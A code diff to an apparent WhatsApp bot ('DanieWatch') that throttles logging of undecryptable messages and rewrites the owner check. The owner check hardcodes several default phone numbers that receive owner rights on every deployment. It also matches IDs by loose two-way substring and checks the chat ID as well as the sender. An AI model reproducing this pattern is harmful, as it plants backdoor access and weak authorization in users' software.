@@ -1286,7 +1286,17 @@ function initUpsertListener(conn) {
             const cleanSender = cleanJid(senderJid);
 
             if (!mek.message) {
-                console.log(`[DanieWatch] ⚠️ Message received from ${cleanSender} (ID: ${mek.key?.id}) but payload is undefined (E2EE decryption pending or retry required).`);
+                // Track undecryptable messages but only log a summary periodically
+                // (old queued messages from before restart will never decrypt — this is normal)
+                if (!conn._undecryptableCount) conn._undecryptableCount = 0;
+                if (!conn._lastUndecryptableLog) conn._lastUndecryptableLog = 0;
+                conn._undecryptableCount++;
+                const now = Date.now();
+                if (now - conn._lastUndecryptableLog > 15000) {
+                    console.log(`[DanieWatch] ⚠️ ${conn._undecryptableCount} message(s) with undefined payload (E2EE pending/old queued messages) — Baileys is re-negotiating sessions.`);
+                    conn._undecryptableCount = 0;
+                    conn._lastUndecryptableLog = now;
+                }
                 return;
             }
 
@@ -1452,26 +1462,41 @@ function saveSudo(nums) {
 function isOwner(senderJid, mek = null) {
     if (mek && mek.key && mek.key.fromMe) return true;
     if (!senderJid) return false;
-    const cJid = cleanJid(senderJid);
-    if (!cJid) return false;
 
-    // Messages with @lid from the paired account or from self are owner
-    if (cJid.includes('@lid')) return true;
+    const rawSender = String(senderJid || '');
+    const rawParticipant = mek && mek.key ? String(mek.key.participant || '') : '';
+    const rawRemote = mek && mek.key ? String(mek.key.remoteJid || '') : '';
 
-    if (_connInstance && _connInstance.user && _connInstance.user.id) {
-        const botClean = cleanJid(_connInstance.user.id);
-        const botNum = botClean.split('@')[0].split(':')[0];
-        const senderNumOnly = cJid.split('@')[0].split(':')[0];
-        if (botNum && (senderNumOnly === botNum || cJid.includes(botNum) || botClean.includes(senderNumOnly))) return true;
+    // If bot instance user object is available, check bot's phone number JID and LID
+    if (_connInstance && _connInstance.user) {
+        const botIdNum = _connInstance.user.id ? _connInstance.user.id.split('@')[0].split(':')[0] : '';
+        const botLidNum = _connInstance.user.lid ? _connInstance.user.lid.split('@')[0].split(':')[0] : '';
+
+        for (const target of [rawSender, rawParticipant, rawRemote]) {
+            if (!target) continue;
+            const targetNum = target.split('@')[0].split(':')[0];
+            if (botIdNum && targetNum === botIdNum) return true;
+            if (botLidNum && targetNum === botLidNum) return true;
+        }
     }
 
-    const senderNum = cJid.split('@')[0].split(':')[0];
+    const cJid = cleanJid(senderJid);
+    const senderNum = cJid ? cJid.split('@')[0].split(':')[0] : '';
     const ownerNum = (process.env.NUMBER || process.env.BOT_NUMBER || '923013068663').trim().replace(/[^0-9]/g, '');
     const envSudoNums = (process.env.SUDO || '923013068663').split(',').map(n => n.trim().replace(/[^0-9]/g, '')).filter(Boolean);
     const dynamicSudo = loadSudo();
     const defaultOwners = ['923013068663', '923000000000', '94762898540', '94717775628', '94758775628'];
     const allOwners = [...defaultOwners, ownerNum, ...envSudoNums, ...dynamicSudo].filter(Boolean);
-    return allOwners.some(owner => owner && (senderNum.includes(owner) || owner.includes(senderNum)));
+
+    for (const target of [rawSender, rawParticipant, rawRemote, senderNum]) {
+        if (!target) continue;
+        const numPart = target.split('@')[0].split(':')[0];
+        if (allOwners.some(owner => owner && (numPart.includes(owner) || owner.includes(numPart)))) {
+            return true;
+        }
+    }
+
+    return false;
 }
 
 // Parse download command item (supports "=", space separation, or no name)
